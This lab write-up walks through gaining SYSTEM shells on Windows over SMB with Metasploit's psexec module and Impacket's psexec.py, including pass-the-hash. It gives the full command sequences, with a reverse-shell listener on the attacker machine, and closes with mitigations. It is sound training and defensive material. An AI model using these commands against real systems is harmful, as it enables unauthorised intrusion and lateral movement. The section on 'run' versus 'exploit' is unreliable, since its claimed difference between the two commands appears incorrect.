Gaining Shell Access via PsExec (Metasploit + Impacket)
Overview

This lab demonstrates how attackers obtain remote shell access inside an Active Directory environment using valid credentials and NTLM password hashes. The objective was to simulate a realistic post-exploitation and lateral movement scenario following credential capture via techniques such as LLMNR/NBT-NS poisoning.

The focus of this lab is not initial access, but what happens after credentials are obtained. This stage is critical in real enterprise breaches, where attackers pivot across the network using administrative access over SMB.

Techniques covered in this lab include:

Metasploit PsExec exploitation

Impacket PsExec usage

Pass-the-Hash authentication

Remote Windows service creation

Comparing multiple remote execution techniques

Understanding why some methods fail in modern environments

Environment: Virtual Active Directory Lab (Windows Domain + Kali Linux)

Lab Environment
Machine	Role
Kali Linux	Attacker machine
Windows Server	Domain Controller
Windows 10	Domain-joined client

Key service used throughout the lab:

SMB (TCP Port 445)

SMB is commonly exposed inside enterprise networks and is one of the most frequently abused services for lateral movement.

Attack Chain Summary

The simulated attack chain followed a realistic enterprise compromise workflow:

Capture credentials or NTLM password hashes

Authenticate to a target machine over SMB

Upload a malicious executable to the ADMIN$ share

Create a remote Windows service

Execute the service remotely

Receive a SYSTEM-level shell

This technique is commonly known as Remote Service Execution via PsExec.

Part 1 — Metasploit PsExec (Password Authentication)
  Loading the Module
  use exploit/windows/smb/psexec
  
  This Metasploit module performs remote service execution using SMB credentials.
  
  Configuring Required Options
  set rhosts <targetIP>
  set smbdomain <domain>
  set smbuser <username>
  set smbpass <password>
  set LHOST <attackerIP>
  set LPORT 4444
  
  These parameters define:
  
  Target host
  
  Authentication credentials
  
  Reverse shell listener settings
  
  Running the Module
  
  Instead of the traditional exploit command, the lab used:
  
  run
  
  This distinction is important and is explained later in the write-up.
  
  Result
  
  A Meterpreter reverse shell was successfully established.
  
  Key indicators of successful exploitation:
  
  SMB authentication succeeded
  
  Payload uploaded to ADMIN$ share
  
  Remote Windows service created
  
  Reverse TCP connection received
  
  This demonstrates how valid credentials alone can enable full remote compromise.

Part 2 — Metasploit Pass-the-Hash

  Instead of using a plaintext password, the attack was repeated using NTLM hashes.
  
  NTLM hash format:
  
  LMHASH:NTHASH
  
  Typical LM hash placeholder:
  
  aad3b435b51404eeaad3b435b51404ee
  Configuring the Module for Pass-the-Hash
  set smbuser administrator
  set smbpass LMHASH:NTHASH
  set --clear smbdomain
  run
  Why Clearing the Domain Matters
  
  Metasploit automatically assigns a default domain (often WORKGROUP).
  When targeting local administrator accounts, the domain value must be cleared.
  
  Failing to do this may cause authentication failures.
  
  Result
  
  Meterpreter shell obtained successfully without knowing the password.
  
  This demonstrates a critical concept:
  
  NTLM hashes function as reusable credentials.

Part 3 — Impacket PsExec (Password Authentication)

  Impacket tools provide a more realistic representation of real-world penetration testing workflows.
  
  Command Used
  psexec.py DOMAIN/user:'password'@targetIP
  Result
  
  A SYSTEM command shell was obtained:
  
  C:\Windows\system32>
  
  Unlike Metasploit, Impacket provides a direct interactive shell instead of a Meterpreter session.

Part 4 — Impacket Pass-the-Hash
  Command Used
  psexec.py administrator@targetIP -hashes LMHASH:NTHASH
  Result
  
  Successful SYSTEM shell using only NTLM hash authentication.
  
  This reinforces the concept that password hashes must be treated as passwords.

Part 5 — Testing Alternative Remote Execution Methods

  Multiple Impacket tools were tested to evaluate reliability.
  
  wmiexec.py Attempt
  
  Result:
  
  RPC_E_INVALID_HEADER
  
  Likely causes:
  
  WMI/DCOM restrictions
  
  Firewall filtering
  
  Endpoint hardening
  
  smbexec.py Attempt
  
  Result:
  
  Connection reset by peer
  
  Likely causes:
  
  SMB hardening
  
  Modern Windows protections
  
  Tool Reliability Comparison
  Tool	Execution Method	Reliability
  psexec.py	Remote service creation	Very high
  wmiexec.py	WMI/DCOM	Moderate
  smbexec.py	SMB named pipes	Low
  
  In real engagements, PsExec is typically the first technique attempted.
  
  How PsExec Works Internally
  
  PsExec abuses administrative privileges to perform remote service execution:
  
  Authenticate to SMB (port 445)
  
  Connect to ADMIN$ administrative share
  
  Upload malicious executable
  
  Create a Windows service remotely
  
  Start the service
  
  Receive SYSTEM-level shell
  
  This technique requires local administrator privileges on the target machine.
  
  Using run vs exploit in Metasploit
  
  During the lab, the PsExec module was executed using:
  
  run
  
  instead of:
  
  exploit
  Difference Between Commands
  Command	Behavior
  exploit	Executes module once
  run	Executes module using smart defaults
  
  run is commonly used because it:
  
  Automatically starts listeners
  
  Uses payload defaults
  
  Reduces configuration mistakes
  
  Speeds up repeated testing
  
  Final Metasploit Workflow
  use exploit/windows/smb/psexec
  set rhosts <targetIP>
  set smbuser <username>
  set smbpass <password>
  set LHOST <attackerIP>
  set LPORT 4444
  run
  Security Implications
  
  This lab highlights several major enterprise security risks:
  
  NTLM hashes can be reused for authentication
  
  SMB admin shares allow remote code execution
  
  Local admin credential reuse enables lateral movement
  
  Weak credential hygiene accelerates network compromise
  
  Mitigations
  
  Organizations can reduce risk by implementing:
  
  Disabling LLMNR and NBT-NS
  
  Enforcing SMB signing
  
  Restricting local administrator privileges
  
  Deploying Microsoft LAPS
  
  Monitoring remote service creation events
  
  Implementing credential guard protections
  
  Skills Demonstrated
  
  Active Directory lab design and deployment
  
  Post-exploitation and lateral movement
  
  Metasploit exploitation workflows
  
  Impacket tool usage
  
  Pass-the-Hash authentication
  
  Windows remote execution techniques
